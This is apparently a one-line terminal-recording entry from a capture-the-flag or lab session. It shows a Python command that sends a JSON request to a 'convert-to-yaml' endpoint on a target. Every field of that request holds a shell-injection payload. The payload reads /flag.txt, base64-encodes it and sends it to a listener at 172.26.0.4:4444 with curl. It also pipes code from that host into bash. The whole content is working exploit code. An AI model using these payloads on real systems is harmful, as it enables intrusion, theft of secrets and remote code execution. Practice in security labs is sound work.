[3394.559787, "i", "python3 -c '\nimport urllib.request, json, time\nres = urllib.request.urlopen(\"http://target:8121/examples\")\norig = json.loads(res.read())[\"examples\"][0]\n\npld = \"$(curl 172.26.0.4:4444/?c=`cat /flag.txt | base64 | tr -d \\\"\\n\\\"`) `curl 172.26.0.4:4444/?s=\\u0024(cat /flag.txt | base64 | tr -d \\\"\\n\\\")` %0A curl 172.26.0.4:4444/?x=1 | bash; curl 172.26.0.4:4444/?y=2\"\n\nnew_data = {}\nfor k, v in orig[\"data\"].items():\n    new_data[k] = v\n\nnew_data[\"signed\"] = {\n    \"name\": pld,\n    \"animalType\": pld,\n    \"crime\": pld,\n    \"role\": pld,\n    \"description\": pld,\n    \"command\": pld,\n    \"exec\": pld\n}\norig[\"data\"] = new_data\n\nreq = urllib.request.Request(\"http://target:8121/convert-to-yaml\", method=\"POST\", data=json.dumps(orig).encode())\nreq.add_header(\"Content-Type\", \"application/json\")\ntry:\n    r = urllib.request.urlopen(req)\n    print(\"STATUS:\", r.status, r.read().decode())\nexcept Exception as e:\n    print(\"ERR:\", e)\n'\n"]
